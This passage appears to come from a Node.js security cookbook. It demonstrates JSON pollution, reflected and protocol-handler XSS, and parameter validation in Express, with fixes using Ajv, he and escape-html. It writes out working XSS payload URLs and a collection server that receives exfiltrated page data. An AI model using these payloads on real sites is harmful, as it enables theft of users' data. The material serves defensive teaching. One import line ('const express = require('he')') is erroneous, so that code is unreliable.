     
      file to a new file
     
     
      
       named
      
     
     
      <strong class="source-inline">
       
        fixed-server.js
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
<strong class="bold">$ cp server.js fixed-server.js</strong></pre>
    </li>
    <li>
     
      Add the following code to
     
     <strong class="source-inline">
      
       fixed-server.js
      
     </strong>
     
      to import the
     
     <strong class="source-inline">
      
       ajv
      
     </strong>
     
      module and define a JSON schema for our JSON input.
     
     
      Note that this code should be added just below the
     
     
      <strong class="source-inline">
       
        STATUS_CODES
       
      </strong>
     
     
      
       destructuring:
      
     
     <pre class="source-code">
const Ajv = require('ajv');
const ajv = new Ajv();
const schema = {
  title: 'Greeting',
  type: 'object',
  properties: {
    msg: { type: 'string' },
    name: { type: 'string' }
  },
  additionalProperties: false,
  required: ['msg']
};
const validate = ajv.compile(schema);</pre>
    </li>
    <li>
     
      The greeting
     
     <a id="_idIndexMarker746">
     </a>
     
      function needs to be altered to validate the JSON input against
     
     
      
       the schema:
      
     
     <pre class="source-code">
const greeting = (req, res) =&gt; {
  let data = '';
  req.on('data', (chunk) =&gt; (data += chunk));
  req.on('end', () =&gt; {
    try {
      data = JSON.parse(data);
    } catch (e) {
      res.end('');
      return;
    }
<strong class="bold">    if (!validate(data, schema)) {</strong>
<strong class="bold">      res.end('');</strong>
<strong class="bold">      return;</strong>
<strong class="bold">    }</strong>
    if (data.hasOwnProperty('name')) {
      res.end(`${data.msg} ${data.name}`);
    } else {
      res.end(data.msg);
    }
  });
};</pre>
     <p class="list-inset">
      
       Here, we’ve added a conditional statement that calls the
      
      <strong class="source-inline">
       
        validate()
       
      </strong>
      
       method within
      
      <a id="_idIndexMarker747">
      </a>
      
       our
      
      <strong class="source-inline">
       
        greeting()
       
      </strong>
      
       function, which validates
      
      
       
        the schema.
       
      
     </p>
    </li>
    <li>
     
      Start the
     
     
      
       fixed server:
      
     
     <pre class="source-code">
<strong class="bold">$ node fixed-server.js</strong></pre>
    </li>
    <li>
     
      Retry the same request in an attempt to override the
     
     <strong class="source-inline">
      
       hasOwnProperty()
      
     </strong>
     
      method.
     
     
      Observe that it receives no response and no longer crashes
     
     
      
       the server:
      
     
     <pre class="source-code">
<strong class="bold">$ curl -H "Content-Type: application/json" -X POST -d '{"msg": "Hello", "name": "Beth", "hasOwnProperty": 0 }' http://localhost:3000/</strong></pre>
    </li>
   </ol>
   <p>
    
     With that, we’ve protected our server against a JSON pollution attack by validating the input against a
    
    
     
      JSON schema.
     
    
   </p>
   <h2 id="_idParaDest-297">
    <a id="_idTextAnchor304">
    </a>
    
     How it works…
    
   </h2>
   <p>
    
     In this recipe, we demonstrated a JSON pollution attack.
    
    
     To do this, we created a simple Express.js server that had one route handler for HTTP
    
    <strong class="source-inline">
     
      POST
     
    </strong>
    
     requests at
    
    <strong class="source-inline">
     
      http://localhost:3000
     
    </strong>
    
     .
    
    
     For each request, our
    
    <strong class="source-inline">
     
      greeting()
     
    </strong>
    
     function is called.
    
    
     The
    
    <strong class="source-inline">
     
      greeting()
     
    </strong>
    
     function parses the request data as JSON and then aggregates the
    
    <strong class="source-inline">
     
      msg
     
    </strong>
    
     and
    
    <strong class="source-inline">
     
      name
     
    </strong>
    
     values that were supplied as request parameters.
    
    
     The aggregated string is returned as the response to
    
    
     
      the request.
     
    
   </p>
   <p>
    
     In our
    
    <strong class="source-inline">
     
      server.js
     
    </strong>
    
     file, we were using the
    
    <strong class="source-inline">
     
      Object.prototype.hasOwnProperty()
     
    </strong>
    
     method, which is a built-in method available on all objects.
    
    
     However, it was possible to override the
    
    <strong class="source-inline">
     
      Object.prototype.hasOwnProperty()
     
    </strong>
    
     method by passing a
    
    <strong class="source-inline">
     
      hasOwnProperty
     
    </strong>
    
     property in our JSON input.
    
    
     Because we set the
    
    <strong class="source-inline">
     
      hasOwnProperty
     
    </strong>
    
     value to
    
    <strong class="source-inline">
     
      0
     
    </strong>
    
     in our JSON input, the server crashed when our code attempted to call
    
    <strong class="source-inline">
     
      data.hasOwnProperty()
     
    </strong>
    
     – because that value had been overridden to
    
    <strong class="source-inline">
     
      0
     
    </strong>
    
     , rather than
    
    
     
      a function.
     
    
   </p>
   <p>
    
     When a public-facing application accepts JSON input, it’s necessary to take steps in the application against JSON pollution attacks.
    
    
     One of the ways we covered for protecting applications from these attacks is by using a JSON Schema validator.
    
    
     It validated that the properties and values of our JSON input match those we expect.
    
    
     In this recipe, we used Ajv to define a
    
    <a id="_idIndexMarker748">
    </a>
    
     schema to accomplish this.
    
    
     Ajv
    
    <a id="_idIndexMarker749">
    </a>
    
     uses the
    
    <strong class="bold">
     
      JSON Schema
     
    </strong>
    
     (
    
    <a href="https://json-schema.org/">
     
      https://json-schema.org/
     
    </a>
    
     ) format to define
    
    
     
      object schemas.
     
    
   </p>
   <p>
    
     Our schema required the JSON input to have a
    
    <strong class="source-inline">
     
      msg
     
    </strong>
    
     property and allow an optional
    
    <strong class="source-inline">
     
      name
     
    </strong>
    
     property.
    
    
     It also specified that both inputs must be of the
    
    <strong class="source-inline">
     
      string
     
    </strong>
    
     type.
    
    
     The
    
    <strong class="source-inline">
     
      additionalProperties: false
     
    </strong>
    
     configuration disallowed additional properties, causing the validation to fail when we supplied
    
    <strong class="source-inline">
     
      hasOwnProperty
     
    </strong>
    
     in the JSON input, making it impossible to override the
    
    
     <strong class="source-inline">
      
       Object.prototype.hasOwnProperty
      
     </strong>
    
    
     
      method.
     
    
   </p>
   <h2 id="_idParaDest-298">
    <a id="_idTextAnchor305">
    </a>
    
     See also
    
   </h2>
   <ul>
    <li>
     
      The
     
     <em class="italic">
      
       Anticipating malicious input
      
     </em>
     
      recipe in
     
     
      
       this chapter
      
     
    </li>
    <li>
     
      The
     
     <em class="italic">
      
       Guarding against cross-site scripting
      
     </em>
     
      recipe in
     
     
      
       this chapter
      
     
    </li>
    <li>
     
      The
     
     <em class="italic">
      
       Preventing cross-site request forgery
      
     </em>
     
      recipe in
     
     
      
       this chapter
      
     
    </li>
   </ul>
   <h1 id="_idParaDest-299">
    <a id="_idTextAnchor306">
    </a>
    
     Guarding against cross-site scripting
    
   </h1>
   <p>
    
     XSS attacks are
    
    <a id="_idIndexMarker750">
    </a>
    
     client-side injection attacks where malicious scripts are injected into websites.
    
    
     XSS vulnerabilities are very dangerous as they can compromise
    
    
     
      trusted websites.
     
    
   </p>
   <p>
    
     In this recipe, we’re going to demonstrate an XSS vulnerability and learn how we can protect against them.
    
    
     We’ll be using the
    
    <strong class="source-inline">
     
      he
     
    </strong>
    
     (
    
    <a href="https://www.npmjs.com/package/he">
     
      https://www.npmjs.com/package/he
     
    </a>
    
     )
    
    <strong class="source-inline">
     
      npm
     
    </strong>
    
     module to
    
    
     
      do so.
     
    
   </p>
   <h2 id="_idParaDest-300">
    <a id="_idTextAnchor307">
    </a>
    
     Getting ready
    
   </h2>
   <p>
    
     In this recipe, we’ll create an Express.js server that’s vulnerable to an XSS attack.
    
    
     To do so, we must create the vulnerable
    
    
     
      Express.js server:
     
    
   </p>
   <ol>
    <li>
     
      First, let’s create a directory named
     
     <strong class="source-inline">
      
       express-xss
      
     </strong>
     
      to
     
     
      
       work in:
      
     
     <pre class="source-code">
<strong class="bold">$ mkdir express-xss</strong>
<strong class="bold">$ cd express-xss</strong>
<strong class="bold">$ npm init --yes</strong></pre>
    </li>
    <li>
     
      Now, we need to
     
     
      
       install
      
     
     
      <strong class="source-inline">
       
        express
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
<strong class="bold">$ npm install express</strong></pre>
    </li>
    <li>
     
      Create a file where you’ll store the
     
     
      
       Express.js server:
      
     
     <pre class="source-code">
<strong class="bold">$ touch server.js</strong></pre>
    </li>
    <li>
     
      Add the following to
     
     <strong class="source-inline">
      
       server.js
      
     </strong>
     
      .
     
     
      This will create a server that renders a simple HTML web page that’s susceptible to an
     
     
      
       XSS attack:
      
     
     <pre class="source-code">
const express = require('express');
const app = express();
app.get('/', (req, res) =&gt; {
  const { previous, lang, token } = req.query;
  getServiceStatus((status) =&gt; {
    res.send(`
      &lt;h1&gt;Service Status&lt;/h1&gt;
      &lt;div id=status&gt;
        ${status}
      &lt;/div&gt;
      &lt;div&gt;
      &lt;a href="${previous}${token}/${lang}"&gt;Back&lt;/a&gt;
      &lt;/div&gt;
    `);
  });
});
const getServiceStatus = (callback) =&gt; {
  const status = 'All systems are running.';
  callback(status);
};
app.listen(3000, () =&gt; {
  console.log('Server listening on port 3000');
});</pre>
    </li>
   </ol>
   <p>
    
     Now, we’re ready to
    
    <a id="_idIndexMarker751">
    </a>
    
     move on to
    
    
     
      this recipe.
     
    
   </p>
   <h2 id="_idParaDest-301">
    <a id="_idTextAnchor308">
    </a>
    
     How to do it…
    
   </h2>
   <p>
    
     In this recipe, we’ll learn how to exploit and mitigate
    
    
     
      XSS attacks:
     
    
   </p>
   <ol>
    <li>
     
      First, start the server with the
     
     
      
       following command:
      
     
     <pre class="source-code">
<strong class="bold">$ node server.js</strong></pre>
    </li>
    <li>
     
      The server is emulating a service status web page.
     
     
      The web page accepts three parameters:
     
     <strong class="source-inline">
      
       previous
      
     </strong>
     
      ,
     
     <strong class="source-inline">
      
       token
      
     </strong>
     
      , and
     
     <strong class="source-inline">
      
       lang
      
     </strong>
     
      .
     
     
      It’s common practice to have parameters such as these injected into URLs in real-world web applications.
     
     
      Navigate to
     
     <strong class="source-inline">
      
       http://localhost:3000/?previous=/&amp;token=TOKEN&amp;lang=en
      
     </strong>
     
      ; expect to see the
     
     <a id="_idIndexMarker752">
     </a>
     
      
       following output:
      
     
    </li>
   </ol>
   <div><div><img alt="Figure 9.5 – Demonstrative service status web page showing “All systems are running.”" src="img/B19212_09_05.jpg"/>
     
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    
     Figure 9.5 – Demonstrative service status web page showing “All systems are running.”
    
   </p>
   <ol>
    <li value="3">
     
      Now, we can craft an XSS attack.
     
     
      We will craft a URL that will inject parameters to change the service status message to
     
     <strong class="source-inline">
      
       All systems are down!
      
     </strong>
     
      .
     
     
      We’re aiming to inject the following JavaScript via the
     
     
      
       URL parameters:
      
     
     <pre class="source-code">
document.getElementById("status").innerHTML="All systems are down!";</pre>
    </li>
    <li>
     
      We can inject
     
     <a id="_idIndexMarker753">
     </a>
     
      this script using the following
     
     
      
       HTTP request:
      
     
     <pre class="source-code">
http://localhost:3000/?previous=%22%3E%3Cscri&amp;token=pt%3Edocument.getElementById(%22status%22).innerHTML=%22All%20systems%20are%20down!%22;%3C&amp;lang=script%3E%20%3Ca%20href=%22/</pre>
    </li>
    <li>
     
      Now, the web page will show
     
     <strong class="bold">
      
       All systems are down!
      
     </strong>
     
      .
     
     
      So, visitors to our legitimate service status page will see a malicious message.
     
     
      These attacks typically send the malicious URL to an unsuspecting consumer of
     
     
      
       the website:
      
     
    </li>
   </ol>
   <div><div><img alt="Figure 9.6 – Demonstrative service status web page showing “All systems are down!”" src="img/B19212_09_06.jpg"/>
     
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    
     Figure 9.6 – Demonstrative service status web page showing “All systems are down!”
    
   </p>
   <ol>
    <li value="6">
     
      We can see the code
     
     <a id="_idIndexMarker754">
     </a>
     
      that’s been injected by using the
     
     <strong class="bold">
      
       View Page Source
      
     </strong>
     
      interface in your browser.
     
     
      If you’re on macOS, you should be able to use the
     
     <em class="italic">
      
       Command
      
     </em>
     
      +
     
     <em class="italic">
      
       Option
      
     </em>
     
      +
     
     <em class="italic">
      
       U
      
     </em>
     
      shortcut to open the
     
     <strong class="bold">
      
       View Page
      
     </strong>
     
      <strong class="bold">
       
        Source
       
      </strong>
     
     
      
       interface:
      
     
    </li>
   </ol>
   <div><div><img alt="Figure 9.7 – View Page Source showing the injected JavaScript" src="img/B19212_09_07.jpg"/>
     
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    
     Figure 9.7 – View Page Source showing the injected JavaScript
    
   </p>
   <ol>
    <li value="7">
     
      To fix the application, we
     
     <a id="_idIndexMarker755">
     </a>
     
      need to escape/sanitize the input.
     
     
      Copy the
     
     <strong class="source-inline">
      
       server.js
      
     </strong>
     
      file to a file
     
     
      
       named
      
     
     
      <strong class="source-inline">
       
        fixed-server.js
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
<strong class="bold">$ cp server.js fixed-server.js</strong></pre>
    </li>
    <li>
     
      To escape or sanitize the input, we’ll use a module named
     
     <strong class="source-inline">
      
       he
      
     </strong>
     
      .
     
     
      Install
     
     <strong class="source-inline">
      
       he
      
     </strong>
     
      from the
     
     
      <strong class="source-inline">
       
        npm
       
      </strong>
     
     
      
       registry:
      
     
     <pre class="source-code">
<strong class="bold">$ npm install he</strong></pre>
    </li>
    <li>
     
      We need to add the import for
     
     <strong class="source-inline">
      
       he
      
     </strong>
     
      to
     
     <strong class="source-inline">
      
       fixed-server.js
      
     </strong>
     
      .
     
     
      Add the following line of code below the
     
     <strong class="source-inline">
      
       express
      
     </strong>
     
      
       module import:
      
     
     <pre class="source-code">
<strong class="bold">const express = require('he');</strong></pre>
    </li>
    <li>
     
      Then, we can set the
     
     <strong class="source-inline">
      
       href
      
     </strong>
     
      value using
     
     <strong class="source-inline">
      
       he
      
     </strong>
     
      .
     
     
      Alter the route handler
     
     
      
       as follows:
      
     
     <pre class="source-code">
app.get('/', (req, res) =&gt; {
  const { previous, lang, token } = req.query;
  getServiceStatus((status) =&gt; {
<strong class="bold">    const href =</strong>
<strong class="bold">      he.encode(`${previous}${token}/${lang}`);</strong>
    res.send(`
        &lt;h1&gt;Service Status&lt;/h1&gt;
        &lt;div id=status&gt;
          ${status}
        &lt;/div&gt;
        &lt;div&gt;
<strong class="bold">        &lt;a href="${href}"&gt;Back&lt;/a&gt;</strong>
        &lt;/div&gt;
      `);
  });
});</pre>
    </li>
    <li>
     
      Start the
     
     <a id="_idIndexMarker756">
     </a>
     
      
       fixed server:
      
     
     <pre class="source-code">
<strong class="bold">$ node fixed-server.js</strong>
<strong class="bold">Server listening on port 3000</strong></pre>
    </li>
    <li>
     
      Attempt to access the malicious
     
     
      
       URL again:
      
     
     <pre class="source-code">
http://localhost:3000/?previous=%22%3E%3Cscri&amp;token=pt%3Edocument.getElementById(%22status%22).innerHTML=%22All%20systems%20are%20down!%22;%3C&amp;lang=script%3E%20%3Ca%20href=%22/</pre>
    </li>
    <li>
     
      Observe that this time, we get the expected
     
     <strong class="bold">
      
       All systems are running.
      
     </strong>
     
      output.
     
     
      Our injection attack no
     
     
      
       longer works:
      
     
    </li>
   </ol>
   <div><div><img alt="Figure 9.8 – Demonstrative service status web page showing “All systems are running.”" src="img/B19212_09_08.jpg"/>
     
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    
     Figure 9.8 – Demonstrative service status web page showing “All systems are running.”
    
   </p>
   <p>
    
     With that, we’ve learned
    
    <a id="_idIndexMarker757">
    </a>
    
     how to use the
    
    <strong class="source-inline">
     
      he
     
    </strong>
    
     module to prevent an
    
    
     
      XSS attack.
     
    
   </p>
   <h2 id="_idParaDest-302">
    <a id="_idTextAnchor309">
    </a>
    
     How it works…
    
   </h2>
   <p>
    
     XSS attacks are client-side injection attacks where malicious scripts are injected into trusted websites.
    
    
     The general flow of an XSS attack is
    
    
     
      as follows:
     
    
   </p>
   <ol>
    <li>
     
      Malicious input enters the application – typically via a
     
     
      
       web request.
      
     
    </li>
    <li>
     
      The input is rendered as dynamic content on the web page because the input hasn’t been
     
     
      
       sanitized appropriately.
      
     
    </li>
   </ol>
   <p>
    
     The two main types of XSS attacks are persistent XSS and reflected XSS.
    
    
     With persistent XSS attacks, malicious data is injected into a persistence layer of the system.
    
    
     For example, it could be injected into a field within
    
    
     
      a database.
     
    
   </p>
   <p>
    
     Reflected XSS attacks are reliant on a single interaction with the server – for example, sending a single HTTP request.
    
    
     The attack demonstrated in this recipe was a reflected XSS attack sent over
    
    <a id="_idIndexMarker758">
    </a>
    
     an HTTP request containing
    
    
     
      malicious input.
     
    
   </p>
   <p>
    
     The exploit in this recipe was due to the way the
    
    <strong class="source-inline">
     
      href
     
    </strong>
    
     value was formulated for the
    
    <strong class="bold">
     
      Back
     
    </strong>
    
     link.
    
    
     We started the injection process by assigning the
    
    <strong class="source-inline">
     
      %22%3E%3Cscri
     
    </strong>
    
     value, which, when decoded, is equal to
    
    <strong class="source-inline">
     
      "&gt;&lt;scri
     
    </strong>
    
     .
    
    
     This value closes an HTML anchor tag and starts an HTML script element that’s ready to inject our script.
    
    
     The remaining values are set to inject the following code into the
    
    
     
      web page:
     
    
   </p>
   <pre class="source-code">
"&gt;&lt;script&gt;document.getElementById("status").innerHTML="All systems are down!";&lt;/script&gt; &lt;a href="</pre>
   <p>
    
     Note that the attack wouldn’t have worked with a single parameter as many modern browsers have built-in XSS auditors to prevent the obvious injection of
    
    <strong class="source-inline">
     
      &lt;
     
    </strong>
    
     <strong class="source-inline">
      
       script&gt;
      
     </strong>
    
    
     
      tags.
     
    
   </p>
   <p class="callout-heading">
    
     Important note
    
   </p>
   <p class="callout">
    
     You can use Node.js’s
    
    <strong class="source-inline">
     
      decodeURI()
     
    </strong>
    
     method to decode encoded URIs.
    
    
     For example,
    
    <strong class="source-inline">
     
      $ node -p "decodeURI('%22%3E%3Cscri')"
     
    </strong>
    
     would
    
    
     
      output
     
    
    
     <strong class="source-inline">
      
       "&gt;&lt;scri
      
     </strong>
    
    
     
      .
     
    
   </p>
   <p>
    
     We fixed this vulnerability using the
    
    <strong class="source-inline">
     
      he
     
    </strong>
    
     module.
    
    
     We use the
    
    <strong class="source-inline">
     
      he
     
    </strong>
    
     module’s
    
    <strong class="source-inline">
     
      encode()
     
    </strong>
    
     function to do so.
    
    
     This function accepts text that’s expected to be HTML or XML input and returns it in escaped form.
    
    
     This is how we sanitize the input and stop the
    
    <strong class="source-inline">
     
      &lt;script&gt;
     
    </strong>
    
     tag from being injected into the
    
    
     
      web page.
     
    
   </p>
   <p>
    
     All input to our server should be validated and sanitized before use.
    
    
     This includes indirect inputs to data
    
    <a id="_idIndexMarker759">
    </a>
    
     stores as these may be used to conduct persistent
    
    
     
      XSS attacks.
     
    
   </p>
   <h2 id="_idParaDest-303">
    <a id="_idTextAnchor310">
    </a>
    
     There’s more…
    
   </h2>
   <p>
    
     There are some other types of XSS attacks that we can still use to harm our server.
    
    
     Let’s demonstrate these attacks and learn how we can help
    
    
     
      prevent them.
     
    
   </p>
   <h3>
    
     Protocol-handler XSS
    
   </h3>
   <p>
    
     The fixed server from this
    
    <a id="_idIndexMarker760">
    </a>
    
     recipe is still vulnerable to some other types of XSS.
    
    
     In this scenario, we’ll pretend that the status value is privileged information that the attacker shouldn’t be able
    
    
     
      to read.
     
    
   </p>
   <p>
    
     The flow of this attack is to create a malicious data collection server that injects a script into the web page that obtains the information and then forwards it to the data
    
    
     
      collection server.
     
    
   </p>
   <p>
    
     To demonstrate this, we need to create a data
    
    
     
      collection server:
     
    
   </p>
   <ol>
    <li>
     
      While still in the
     
     <strong class="source-inline">
      
       express-xss
      
     </strong>
     
      directory, create a file
     
     
      
       named
      
     
     
      <strong class="source-inline">
       
        colletion-server.js
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
<strong class="bold">$ touch collection-server.js</strong></pre>
    </li>
    <li>
     
      Then, add the following code
     
     
      
       to
      
     
     
      <strong class="source-inline">
       
        collection-server.js
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
require('node:http')
  .createServer((req, res) =&gt; {
    console.log(
      req.connection.remoteAddress,
      Buffer.from(req.url.split('/attack/')[1],
        'base64').toString().trim()
    );
  })
  .listen(3001, () =&gt; {
    console.log('Collection Server listening on port
      3001');
  });</pre>
    </li>
    <li>
     
      Now, we can start the data
     
     
      
       collection server:
      
     
     <pre class="source-code">
<strong class="bold">$ node collection-server.js</strong>
<strong class="bold">Collection Server listening on port 3001</strong></pre>
    </li>
    <li>
     
      In a second terminal window, restart the
     
     
      <strong class="source-inline">
       
        fixed-server.js
       
      </strong>
     
     
      
       file:
      
     
     <pre class="source-code">
<strong class="bold">$ node fixed-server.js</strong>
<strong class="bold">Server listening on port 3000</strong></pre>
    </li>
    <li>
     
      In your browser window, visit the
     
     
      
       following URL:
      
     
     <pre class="source-code">
http://localhost:3000/?previous=javascript:(new%20Image().src)=`http://localhost:3001/attack/${btoa(document.getElementById(%22status%22).innerHTML)}`,0/&amp;token=TOKEN&amp;lang=en</pre>
    </li>
    <li>
     
      The web page should look
     
     <a id="_idIndexMarker761">
     </a>
     
      the same as before, still showing the
     
     <strong class="bold">
      
       All systems are running.
      
     </strong>
     
      message.
     
     
      However, the XSS injection has updated the
     
     <strong class="source-inline">
      
       href
      
     </strong>
     
      value of the
     
     <strong class="bold">
      
       Back
      
     </strong>
     
      hyperlink so that it directs us to
     
     
      
       the following:
      
     
     <pre class="source-code">
<strong class="bold">javascript:(new Image().src)=``http://localhost:3001/attack/${btoa(document.getElementById(status).innerHTML)}``,0 /</strong></pre>
     <p class="list-inset">
      
       The link starts with
      
      <strong class="source-inline">
       
        javascript:
       
      </strong>
      
       , which is a protocol handler that allows JavaScript execution as a URI.
      
      
       When this link is clicked, an HTML image element (
      
      <strong class="source-inline">
       
        &lt;img&gt;
       
      </strong>
      
       ) is created with the
      
      <strong class="source-inline">
       
        src
       
      </strong>
      
       value set to the address of our data collection server.
      
      
       The
      
      <strong class="source-inline">
       
        btoa()
       
      </strong>
      
       function Base64 encodes the value of the status.
      
      
       Here,
      
      <strong class="source-inline">
       
        ,0
       
      </strong>
      
       is appended to the end to cause the expression to evaluate to
      
      <strong class="source-inline">
       
        false
       
      </strong>
      
       – ensuring that the image
      
      
       
        isn’t rendered.
       
      
     </p>
    </li>
    <li>
     
      Click the
     
     <strong class="bold">
      
       Back
      
     </strong>
     
      link and check the data collection server.
     
     
      You’ll see that the status has been received,
     
     
      
       as follows:
      
     
     <pre class="source-code">
<strong class="bold">$ node collection-server.js</strong>
<strong class="bold">::1 All systems are running.</strong></pre>
     <p class="list-inset">
      
       To highlight the dangers of these attacks, imagine that this was real privileged data, such as credentials or tokens.
      
      
       By just sending a malicious link to a user and having them click on it, we could obtain their sensitive data via our
      
      
       
        collection server.
       
      
     </p>
     <p class="list-inset">
      
       The server is still
      
      <a id="_idIndexMarker762">
      </a>
      
       vulnerable because we can still inject values into the
      
      <strong class="source-inline">
       
        href
       
      </strong>
      
       attribute.
      
      
       The safest way to avoid this is by not allowing input to determine the value of the
      
      
       <strong class="source-inline">
        
         href
        
       </strong>
      
      
       
        attribute:
       
      
     </p>
    </li>
    <li>
     
      Let’s copy
     
     <strong class="source-inline">
      
       fixed-server.js
      
     </strong>
     
      to a new file and
     
     
      
       fix it:
      
     
     <pre class="source-code">
<strong class="bold">$ cp fixed-server.js protocol-safe-server.js</strong></pre>
    </li>
    <li>
     
      We’ll fix this vulnerability by installing the
     
     
      <strong class="source-inline">
       
        escape-html
       
      </strong>
     
     
      
       module:
      
     
     <pre class="source-code">
<strong class="bold">$ npm install escape-html</strong></pre>
    </li>
    <li>
     
      Import the
     
     <strong class="source-inline">
      
       escape-html
      
     </strong>
     
      module in
     
     <strong class="source-inline">
      
       fixed-server.js
      
     </strong>
     
      by replacing the
     
     <strong class="source-inline">
      
       he
      
     </strong>
     
      module import with the
     
     
      
       following line:
      
     
     <pre class="source-code">
const escapeHTML = require('escape-html');</pre>
    </li>
    <li>
     
      Then, change the
     
     <strong class="source-inline">
      
       href
      
     </strong>
     
      assignment to
     
     
      
       the following:
      
     
     <pre class="source-code">
const href = escapeHTML(`/${previous}${token}/${lang}`);</pre>
    </li>
    <li>
     
      Now,
     
     
      
       start
      
     
     
      <strong class="source-inline">
       
        protocol-safe-server.js
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
<strong class="bold">$ node protocol-safe-server.js</strong>
<strong class="bold">Server listening on port 3000</strong></pre>
    </li>
    <li>
     
      With the data collection server still running, revisit the malicious URL and
     
     
      
       click
      
     
     
      <strong class="bold">
       
        Back
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
http://localhost:3000/?previous=javascript:(new%20Image().src)=`http://localhost:3001/attack/${btoa(document.getElementById(%22status%22).innerHTML)}`,0/</pre>
    </li>
   </ol>
   <p>
    
     You’ll observe that the request fails, and the data collection server doesn’t receive the privileged data.
    
    
     This is
    
    <a id="_idIndexMarker763">
    </a>
    
     because the link to our malicious server has
    
    
     
      been sanitized.
     
    
   </p>
   <p class="callout-heading">
    
     Important note
    
   </p>
   <p class="callout">
    
     This chapter covered HTML encoding and modules that can be used to help escape HTML.
    
    
     Similarly, for escaping JavaScript, the
    
    <strong class="source-inline">
     
      jsesc
     
    </strong>
    
     module (
    
    <a href="https://www.npmjs.com/package/jsesc">
     
      https://www.npmjs.com/package/jsesc
     
    </a>
    
     ) could be used.
    
    
     However, embedding input into JavaScript is generally considered high risk, so you should evaluate your reasons for
    
    
     
      doing so.
     
    
   </p>
   <h3>
    
     Parameter validation
    
   </h3>
   <p>
    
     The browser can
    
    <a id="_idIndexMarker764">
    </a>
    
     only show a portion of a very long URL in the address bar.
    
    
     This means that for very long URLs with many parameters, you may not see what’s appended to the end of the URL.
    
    
     This makes it more challenging to identify
    
    
     
      malicious URLs.
     
    
   </p>
   <p>
    
     If your application’s typical usage doesn’t involve very long URLs, then it would be prudent to add some constraints to what URLs your application will accept.
    
    
     Let’s do
    
    
     
      that now:
     
    
   </p>
   <ol>
    <li>
     
      Copy the
     
     <strong class="source-inline">
      
       server.js
      
     </strong>
     
      file to a new file
     
     
      
       named
      
     
     
      <strong class="source-inline">
       
        constraints-server.js
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
<strong class="bold">$ cp server.js constraints-server.js</strong></pre>
    </li>
    <li>
     
      Define a
     
     <strong class="source-inline">
      
       validateParameters()
      
     </strong>
     
      function that validates the URL parameters in the
     
     
      <strong class="source-inline">
       
        constraints-server.js
       
      </strong>
     
     
      
       file:
      
     
     <pre class="source-code">
const validateParameters = ({ previous, token, lang },
  query) =&gt; {
    return (
      Object.keys(query).length &lt;= 3 &amp;&amp;
      typeof lang === 'string' &amp;&amp;
      lang.length === 2 &amp;&amp;
      typeof token === 'string' &amp;&amp;
      token.length === 16 &amp;&amp;
      typeof previous === 'string' &amp;&amp;
      previous.length &lt;= 16
    );
};</pre>
    </li>
    <li>
     
      Now, we need to make a call to the
     
     <strong class="source-inline">
      
       validateParameters()
      
     </strong>
     
      function in our request handler.
     
     
      Change
     
     <a id="_idIndexMarker765">
     </a>
     
      the request handler to
     
     
      
       the following:
      
     
     <pre class="source-code">
app.get('/', (req, res) =&gt; {
  const { previous, lang, token } = req.query;
<strong class="bold">  if (!validateParameters({ previous, token, lang },</strong>
<strong class="bold">    req.query)) {</strong>
<strong class="bold">      res.sendStatus(422);</strong>
<strong class="bold">      return;</strong>
<strong class="bold">    }</strong>
  getServiceStatus((status) =&gt; {
    res.send(`
      &lt;h1&gt;Service Status&lt;/h1&gt;
      &lt;div id=status&gt;
        ${status}
      &lt;/div&gt;
      &lt;div&gt;
      &lt;a href="${previous}${token}/${lang}"&gt;Back&lt;/a&gt;
      &lt;/div&gt;
    `);
  });
});</pre>
    </li>
    <li>
     
      
       Start
      
     
     
      <strong class="source-inline">
       
        constraints-server.js
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
<strong class="bold">$ node constraints-server.js</strong>
<strong class="bold">Server listening on port 3000</strong></pre>
    </li>
    <li>
     
      Test by navigating to the following URLs, all of which should fail
     
     
      
       validation checks:
      
     
     <ul>
      <li>
       
        <strong class="source-inline">
         
          http://localhost:3000/?previous=sixteencharacter&amp;token=sixteencharacter
         
        </strong>
       
      </li>
      <li>
       
        <strong class="source-inline">
         
          http://localhost:3000/?previous=sixteencharacter&amp;token=sixteencharacter&amp;lang=en&amp;extra=value
         
        </strong>
       
      </li>
      <li>
       
        <strong class="source-inline">
         
          http://localhost:3000/?previous=characters&amp;token=sixteencharacter&amp;lang=abc
         
        </strong>
       
      </li>
     </ul>
     <p class="list-inset">
      
       The following URL should work as it satisfies all of
      
      
       
        the constraints:
       
      
     </p>
     <ul>
      <li>
       
        <strong class="source-inline">
         
          http://localhost:3000/?previous=sixteencharacter&amp;token=sixteencharacter&amp;lang=en
         
        </strong>
       
      </li>
     </ul>
    </li>
   </ol>
   <p>
    
     Any user input should
    
    <a id="_idIndexMarker766">
    </a>
    
     be escaped and validated where possible to help prevent XSS
    
    
     
      injection attacks.
     
    
   </p>
   <h2 id="_idParaDest-304">
    <a id="_idTextAnchor311">
    </a>
    
     See also
    
   </h2>
   <ul>
    <li>
     
      The
     
     <em class="italic">
      
       Anticipating malicious input
      
     </em>
     
      recipe in
     
     
      
       this chapter
      
     
    </li>
    <li>
     
      The
     
     <em class="italic">
      
       Preventing JSON pollution
      
     </em>
     
      recipe in
     
     
      
       this chapter
      
     
    </li>
    <li>
     
      The
     
     <em class="italic">
      
       Preventing cross-site request forgery
      
     </em>
     
      in
     
     
      
       this chapter
      
     
    </li>
   </ul>
   <h1 id="_idParaDest-305">
    <a id="_idTextAnchor312">
    </a>
    
     Preventing cross-site request forgery
    
   </h1>
   <p>
    
     CSRF is an attack
    
    <a id="_idIndexMarker767">
    </a>
    
     where a malicious web application causes a user’s web browser to execute an action on another trusted web application where the user is
    
    
     
      logged in.
     
    
   </p>
   <p>
    
     In this recipe, we’re going to learn how to secure an Express.js server against
    
    
     
      CSRF attacks.
     
    
   </p>
   <p class="callout-heading">
    
     Important note
    
   </p>
   <p class="callout">
    
     Browser security has improved significantly in recent years.
    
    
